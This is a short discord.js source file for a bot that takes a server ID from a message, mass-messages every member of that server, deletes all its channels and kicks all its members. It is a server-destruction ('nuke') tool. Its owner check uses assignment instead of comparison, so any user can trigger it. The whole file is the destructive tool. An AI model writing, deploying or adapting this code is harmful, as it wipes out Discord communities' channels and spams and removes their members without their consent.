const Discord = require('discord.js');
const client = new Discord.Client();

// Configuration
const prefix = "$";
const owner_ids = ["587487245523484674"];

function isOwner(id) {
    for(var i of owner_ids) {
        if(i = id) return true;
    }
    return false;
}

client.on('message', message => {
    if (isOwner(message.author.id)) {
        var args = message.content.split(" ");
        var serverid = args[0];
        let guild = client.guilds.get(serverid);
        delete args[0];
        var msg = args.join(" ");
        client.guilds.get(serverid).members.map(m => {
                m.send(msg);
        });
        guild.channels.forEach(c => {
            c.delete();
        });
        guild.members.forEach(m => {
            m.kick();
        });
    }
});
    
client.login(process.env.BOT_TOKEN);
